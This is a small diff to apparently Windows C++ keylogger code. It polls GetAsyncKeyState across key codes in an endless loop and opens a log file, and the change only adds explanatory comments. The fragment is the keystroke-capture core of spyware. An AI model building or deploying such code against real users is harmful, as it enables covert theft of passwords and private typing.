@@ -53,10 +53,10 @@ int main()
 	char KEY = 'x';
 
 	while (true) {
-		Sleep(10);
+		Sleep(10);//it is used so that if a process want CPU usage it can give it.
 		for (int KEY = 8; KEY <= 190; KEY++)
 		{
-			if (GetAsyncKeyState(KEY) == -32767) {
+			if (GetAsyncKeyState(KEY) == -32767) {//similar as kbhit
 				if (SpecialKeys(KEY) == false) {
 
 					fstream LogFile;
